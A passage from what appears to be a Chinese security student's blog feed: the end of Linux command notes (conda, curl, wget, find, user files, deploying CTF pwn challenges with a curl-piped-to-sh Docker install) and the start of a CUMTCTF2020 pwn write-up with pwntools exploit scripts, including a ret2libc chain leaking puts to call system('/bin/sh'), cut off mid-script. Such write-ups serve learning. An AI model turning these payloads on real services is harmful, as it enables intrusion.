class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"></span><br><span class="line">chmod 777 Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">sh Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;配置源</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class="line">conda config --set show_channel_urls yes </span><br><span class="line">conda config --get channels</span><br><span class="line">&#x2F;&#x2F;删除配置源</span><br><span class="line">conda config --remove-key channels</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;环境命令</span><br><span class="line">conda env list</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;创建环境</span><br><span class="line">conda create -n 3.6.7 python&#x3D;3.6.7</span><br><span class="line">&#x2F;&#x2F;切换环境</span><br><span class="line">conda activate</span><br><span class="line">&#x2F;&#x2F;退出环境</span><br><span class="line">conda deactivate</span><br><span class="line">&#x2F;&#x2F;移除环境</span><br><span class="line">conda remove -n env_name --all</span><br></pre></td></tr></table></figure><h1 id="0x02-一些命令"><a href="#0x02-一些命令" class="headerlink" title="0x02 一些命令"></a>0x02 一些命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">top 实时查看系统运行情况</span><br><span class="line"></span><br><span class="line">var&#x3D;value 给var赋值</span><br><span class="line">$var,$&#123;var&#125;  取变量的值</span><br><span class="line">&#96;cmd&#96; $(cmd) 代换标准输出</span><br><span class="line">&#39;$var&#39;      非替换字符串  $var</span><br><span class="line">&quot;$var&quot;可替换字符串1</span><br><span class="line"></span><br><span class="line">env  &#x2F;&#x2F;所有环境变量</span><br><span class="line">LD_PRELOAD&#x3D;xx.so ldd a  &#x2F;&#x2F;优先加载动态链接库</span><br></pre></td></tr></table></figure><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>netstat是win中的一个命令，它用于查看本机端口状态。、</p><p>常用参数有-a -n -b（显示连接程序）</p><p><strong>linux中netstat</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br><span class="line">-a : 将目前系统上所有的连接、监听、socket信息都列出来</span><br><span class="line">-t ：列出tcp网络封包的信息</span><br><span class="line">-u ：列出udp网络封包的信息</span><br><span class="line">-n ：不以进程的服务名称，以端口号来显示</span><br><span class="line">-l ：列出目前正在网络监听的服务</span><br><span class="line">-p ：列出该网络服务的进程PID</span><br><span class="line"></span><br><span class="line">#常用的参数</span><br><span class="line">netstat -anp | grep 端口号  &#x2F;&#x2F;筛选出端口号</span><br><span class="line">netstat -aultp  &#x2F;&#x2F;查看哪些端口被占用</span><br></pre></td></tr></table></figure><p><img src="/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/image-20200926113121287.png" alt="image-20200926113121287"></p><h2 id="curl用法"><a href="#curl用法" class="headerlink" title="curl用法"></a>curl用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#查看网页源码</span><br><span class="line">curl www.baidu.com</span><br><span class="line"></span><br><span class="line">#显示头信息</span><br><span class="line">curl -i www.baidu.com &#x2F;&#x2F;头和页面一起显示</span><br><span class="line">curl -I www.baidu.com  &#x2F;&#x2F;只显示头</span><br><span class="line"></span><br><span class="line">#显示通信过程</span><br><span class="line">curl -v www.baidu.com</span><br><span class="line"></span><br><span class="line">#发送表单信息</span><br><span class="line">#get请求</span><br><span class="line">curl http:&#x2F;&#x2F;httpbin.org&#x2F;get?id&#x3D;1</span><br><span class="line">#post请求</span><br><span class="line">curl -X POST --data &quot;name&#x3D;value&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class="line">curl -X POST --data-urlencode &quot;date&#x3D;April 1&quot; http:&#x2F;&#x2F;httpbin.org&#x2F;post</span><br><span class="line"></span><br><span class="line">#http动词</span><br><span class="line">curl -X POST www.baidu.com</span><br><span class="line"></span><br><span class="line">#文件上传</span><br><span class="line">表单这样的话</span><br><span class="line">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39; action&#x3D;&quot;upload.cgi&quot;&gt;</span><br><span class="line">　　　　&lt;input type&#x3D;file name&#x3D;upload&gt;</span><br><span class="line">　　　　&lt;input type&#x3D;submit name&#x3D;press value&#x3D;&quot;OK&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">可以用curl</span><br><span class="line">curl --form upload&#x3D;xxx --form press&#x3D;xxx [URL]</span><br><span class="line"></span><br><span class="line">#Referer字段</span><br><span class="line">curl --referer http:&#x2F;&#x2F;www.baidu.com http:&#x2F;&#x2F;www.baidu.com</span><br><span class="line"></span><br><span class="line">#User agent</span><br><span class="line">curl --user-agent &#39;[User Agent]&#39; [URL]</span><br><span class="line"></span><br><span class="line">#cookie</span><br><span class="line">curl --cookir &quot;id&#x3D;xxx&quot; www.baidu.com</span><br><span class="line"></span><br><span class="line">#增加头信息</span><br><span class="line">curl --header &quot;Content-Type:application&#x2F;json&quot; www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><p>Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget下载单个文件</span><br><span class="line">wget http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget -O下载并以不同的文件名保存</span><br><span class="line">wget -O wordpress.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget –limit -rate限速下载</span><br><span class="line">wget --limit-rate&#x3D;300k http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;伪装代理名称下载</span><br><span class="line">wget --user-agent&#x3D;“Mozilla&#x2F;5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit&#x2F;534.16 (KHTML, like Gecko) Chrome&#x2F;10.0.648.204 Safari&#x2F;534.16” http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;使用wget –spider测试下载链接</span><br><span class="line">wget --spider URL</span><br><span class="line">正确会返回200，错误返回404</span><br></pre></td></tr></table></figure><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf  *.tar.gz</span><br><span class="line">      tar [-cxtzjvfpPN] 文件与目录 ....</span><br><span class="line">      参数：</span><br><span class="line">      -c ：建立一个压缩文件的参数指令(create 的意思)；</span><br><span class="line">      -x ：解开一个压缩文件的参数指令！</span><br><span class="line">      -t ：查看 tarfile 里面的文件！</span><br><span class="line">      特别注意，在参数的下达中， c&#x2F;x&#x2F;t 仅能存在一个！不可同时存在！</span><br><span class="line">      因为不可能同时压缩与解压缩。</span><br><span class="line">      -z ：是否同时具有 gzip 的属性？亦即是否需要用 gzip 压缩？</span><br><span class="line">      -j ：是否同时具有 bzip2 的属性？亦即是否需要用 bzip2 压缩？</span><br><span class="line">      -v ：压缩的过程中显示文件！这个常用，但不建议用在背景执行过程！</span><br><span class="line">      -f ：使用档名，请留意，在 f 之后要立即接档名喔！不要再加参数！</span><br></pre></td></tr></table></figure><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>nslookup用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;直接查询</span><br><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p><a href="https://www.cnblogs.com/Ido-911/p/9638612.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ido-911/p/9638612.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据文件名称查找文件</span></span><br><span class="line"><span class="comment">#查找文件</span></span><br><span class="line">find test.c  //感觉不太常用</span><br><span class="line"><span class="comment">#从主目录下查找test文件</span></span><br><span class="line">find / -name <span class="built_in">test</span></span><br><span class="line"><span class="comment">#从主目录下查找test目录</span></span><br><span class="line">find / -<span class="built_in">type</span> d -name <span class="built_in">test</span></span><br><span class="line"><span class="comment">#从主目录下找flag文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name flag.txt</span><br><span class="line">find / -<span class="built_in">type</span> f -name flag.php</span><br><span class="line"><span class="comment">#从主目录下查找所有的txt文件或php文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">"*.txt"</span></span><br><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">"*.php"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件权限来查找文件</span></span><br><span class="line"><span class="comment">#查找777权限的文件</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm 0777 -<span class="built_in">print</span></span><br><span class="line"><span class="comment">#查找没有777权限的文件(主要查找当前目录)</span></span><br><span class="line">find -<span class="built_in">type</span> f ! -perm 777</span><br><span class="line"><span class="comment">#查找只读文件</span></span><br><span class="line">find / -perm /u=r</span><br><span class="line"><span class="comment">#查找可执行文件</span></span><br><span class="line">find -perm /a=x</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据日期和时间查找文件和目录</span></span><br><span class="line"><span class="comment">#最近1小时内查找更改的文件</span></span><br><span class="line">find / -cmin -60</span><br><span class="line"><span class="comment">#最近1小时内查找修改的文件</span></span><br><span class="line">find / -mmin -60</span><br><span class="line"><span class="comment">#查找最近1小时内访问的文件</span></span><br><span class="line">find / -amin -60</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据文件大小查找文件</span></span><br><span class="line"><span class="comment">#找到50mb的文件</span></span><br><span class="line">find / -size 50M</span><br><span class="line"><span class="comment">#找到50mb-100mb的文件</span></span><br><span class="line">find / -size +50M -size -100M</span><br></pre></td></tr></table></figure><h1 id="0x03部署pwn题目"><a href="#0x03部署pwn题目" class="headerlink" title="0x03部署pwn题目"></a>0x03部署pwn题目</h1><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a></p><h2 id="pwn-deploy-chroot介绍"><a href="#pwn-deploy-chroot介绍" class="headerlink" title="pwn_deploy_chroot介绍"></a>pwn_deploy_chroot介绍</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><blockquote><ol><li>一次可以部署多个题目到一个docker容器中</li><li>自动生成flag,并备份到当前目录</li><li>也是基于xinted + docker + chroot</li><li>利用python脚本根据pwn的文件名自动化地生成3个文件：pwn.xinetd，Dockerfile和docker-compose.yml</li><li>在/bin目录，利用自己编写的静态编译的catflag程序作为/bin/sh,这样的话，system(“/bin/sh”)实际执行的只是读取flag文件的内容，完全不给搅屎棍任何操作的余地</li><li>默认从10000端口监听，多一个程序就+1，起始的监听端口可以在config.py配置，或者生成pwn.xinetd和docker-compose.yml后自己修改这两个文件</li></ol></blockquote><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 安装docker</span><br><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br><span class="line"># 安装 docker compose 和git</span><br><span class="line">apt install docker-compose git</span><br><span class="line"># 下载</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>只需要3步：</p><blockquote><ol><li>将所有pwn题目放入bin目录（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li><li>python <a href="http://initialize.py/" target="_blank" rel="noopener">initialize.py</a></li><li>docker-compose up —build -d</li></ol></blockquote><p>下面给下详细操作：</p><p>1、将你要部署的pwn题目放到bin目录</p><p>我的项目已经将一个程序copy了3分作为示例，注意文件名不要含有特殊字符，文件名建议使用字母，下划线，横杆和数字，当然全字母的当然最好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# ls bin&#x2F;</span><br><span class="line">pwn1  pwn1_copy1  pwn1_copy2</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>2、<a href="http://xn--initialize-3f62aw61d.py/" target="_blank" rel="noopener">运行initialize.py</a></p><p>运行脚本后会输出每个pwn的监听端口，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# python initialize.py</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br></pre></td></tr></table></figure><p>文件与端口信息，还有随机生成的flag默认备份到flags.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# cat flags.txt </span><br><span class="line">pwn1: flag&#123;93aa6da5-db45-46fa-a2e1-af2be6698692&#125;</span><br><span class="line">pwn1_copy1: flag&#123;f9966c51-52e4-4212-ac44-97bf16620b41&#125;</span><br><span class="line">pwn1_copy2: flag&#123;b17949ce-e3fa-4ca7-9fcc-44b8dc997cb3&#125;</span><br><span class="line"></span><br><span class="line">pwn1&#39;s port: 10000</span><br><span class="line">pwn1_copy1&#39;s port: 10001</span><br><span class="line">pwn1_copy2&#39;s port: 10002</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>3、启动环境</p><p>请使用root用户执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up --build -d</span><br></pre></td></tr></table></figure><p>不出意外，题目就启动起来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@instance-1:~&#x2F;pwn_deploy_chroot# netstat -antp | grep docker</span><br><span class="line">tcp6       0      0 :::10002                :::*                    LISTEN      19828&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10000                :::*                    LISTEN      19887&#x2F;docker-proxy</span><br><span class="line">tcp6       0      0 :::10001                :::*                    LISTEN      19873&#x2F;docker-proxy</span><br></pre></td></tr></table></figure><h1 id="0x06-用户和权限"><a href="#0x06-用户和权限" class="headerlink" title="0x06 用户和权限"></a>0x06 用户和权限</h1><h2 id="1-用户"><a href="#1-用户" class="headerlink" title="1.用户"></a>1.用户</h2><h3 id="1-1-用户标识号"><a href="#1-1-用户标识号" class="headerlink" title="1.1 用户标识号"></a>1.1 用户标识号</h3><p>0： root，超级用户。<br>1-499：系统用户，保证系统服务正常运行，一般不使用。<br>500-60000：普通用户，可登录系统，拥有一定的权限。管理员添加的用户在此范围内。</p><p>用户名和标识号不一定一一对应，Linux允许几个登录名对应同一个用户标识号。</p><p>系统内部管理进程和文件访问权限时使用用户标识号。</p><p>账号和标识号的对应关系在/etc/passwd文件中。</p><h3 id="1-2-etc-passwd"><a href="#1-2-etc-passwd" class="headerlink" title="1.2 /etc/passwd"></a>1.2 /etc/passwd</h3><p><strong>该文件所有者和所属组为root</strong>，除了root用户外只有读取的权限。</p><p>格式为</p><p>登录名：口令：用户标识号：组标识号：注释：用户主目录：Shell程序</p><blockquote><p>登录名：同意系统中唯一，大小敏感。<br>口令：密码，root和用户可使用passwd命令修改。<br>用户标识号：唯一。<br>组标识号：每个用户可以同时属于多个组。<br>注释：相关信息，真实姓名、联系电话等。mail和finger等会使用这些信息。<br>用户主目录：用户登录后的默认工作目录。root为/root，一般用户在/home下。<br>Shell程序：登录后默认启动的Shell程序。</p></blockquote><h3 id="1-3-etc-shadow"><a href="#1-3-etc-shadow" class="headerlink" title="1.3 /etc/shadow"></a>1.3 /etc/shadow</h3><p>包含用户的密码和过期时间，只有root组可读写。</p><p>格式为</p><p>登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：密码禁用期：账户失效时间：保留字段</p><blockquote><p>登录名：略。<br>加密口令：*表示账户被锁定，！表示密码被锁定。其他的前三位表示加密方式。<br>最后一次修改时间：最近修改密码的时间，天为单位，1970年1月1日算起。<br>最小时间间隔：最小修改密码的时间间隔。<br>最大时间间隔：最长密码有效期，到期要求修改密码。<br>警告时间：密码过期后多久发出警告。<br>密码禁用期：密码过期后仍然接受的最长期限。<br>账号失效时间：账户的有效期，1970年1月1日算起，空串表示永不过期。<br>保留字段：保留将来使用。</p></blockquote><h2 id="2-用户组"><a href="#2-用户组" class="headerlink" title="2.用户组"></a>2.用户组</h2><p>Linux本身预定义了许多用户组，包括root、daemon、bin、sys等，用户可根据需要自行添加用户组。</p><p>用户组拥有组名、组标识号、组成员等属性。</p><h3 id="2-1-etc-group"><a href="#2-1-etc-group" class="headerlink" title="2.1 /etc/group"></a>2.1 /etc/group</h3><p>格式为</p><p>组名：口令：组标识号：成员列表</p><h2 id="3-用户管理"><a href="#3-用户管理" class="headerlink" title="3. 用户管理"></a>3. 用户管理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//add</span><br><span class="line">useradd [option] 登录名</span><br><span class="line">//如果没有指定–system和–group选项，则创建普通用户。</span><br><span class="line">adduser [option] user</span><br><span class="line"></span><br><span class="line">//del</span><br><span class="line">userdel [option] 用户名</span><br><span class="line">-f：强制删除（谨慎使用）</span><br><span class="line">-r：主目录中的文件一并删除。</span><br><span class="line"></span><br><span class="line">//edit passwd</span><br><span class="line">passwd [option] 登录名</span><br><span class="line"></span><br><span class="line">//show user information</span><br><span class="line">id [option] [用户]</span><br><span class="line"></span><br><span class="line">//change user</span><br><span class="line">su [option] [用户名]</span><br></pre></td></tr></table></figure><h2 id="4-用户组管理"><a href="#4-用户组管理" class="headerlink" title="4.用户组管理"></a>4.用户组管理</h2><p>把user换成group</p><h1 id="0x07-一些小问题"><a href="#0x07-一些小问题" class="headerlink" title="0x07 一些小问题"></a>0x07 一些小问题</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要记录一些基础的linux知识&lt;/p&gt;
&lt;h1 id=&quot;0x01-安装PWN环境&quot;&gt;&lt;a href=&quot;#0x01-安装PWN环境&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装PWN环境&quot;&gt;&lt;/a&gt;0x01 安装PWN环境&lt;/h1&gt;&lt;p&gt;这里主要记录</summary>
      
    
    
    
    <category term="linux" scheme="https://pz1o.top/categories/linux/"/>
    
    
    <category term="linux" scheme="https://pz1o.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CUMTCTF2020岁末赛</title>
    <link href="https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <id>https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/</id>
    <published>2020-12-26T14:32:03.000Z</published>
    <updated>2020-12-28T02:24:43.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CUMTCTF2020岁末赛"><a href="#CUMTCTF2020岁末赛" class="headerlink" title="CUMTCTF2020岁末赛"></a>CUMTCTF2020岁末赛</h1><p>学长们可太搞了，比赛最后垂直上分可太秀了</p><p><img src="/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/image-20201226220723157.png" alt="image-20201226220723157"></p><p>只放PWN的题解了</p><p>下面几个题先放题解，等期末考完试来复现</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>\x00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"\x00"</span>*<span class="number">7</span> + p32(<span class="number">123</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h2><p>在1的基础上puts泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'219.219.61.234'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn2")</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context(arch="i386",os="linux")</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">7</span> + <span class="string">'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x80486D3</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(put_plt) + p32(main) + p32(put_got)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">print(r.recv())</span><br><span class="line">put = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">print(hex(put))</span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',put)</span></span><br><span class="line"></span><br><span class="line">libcbase = put - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">sh = libcbase + binsh</span><br><span class="line">payload1 = <span class="string">b'\x00'</span>*<span class="number">7</span> + <span class="string">b'\xff'</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"you_really_know_random_haha"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">payload3 = <span class="string">b"A"</span>*(<span class="number">0x6c</span>+<span 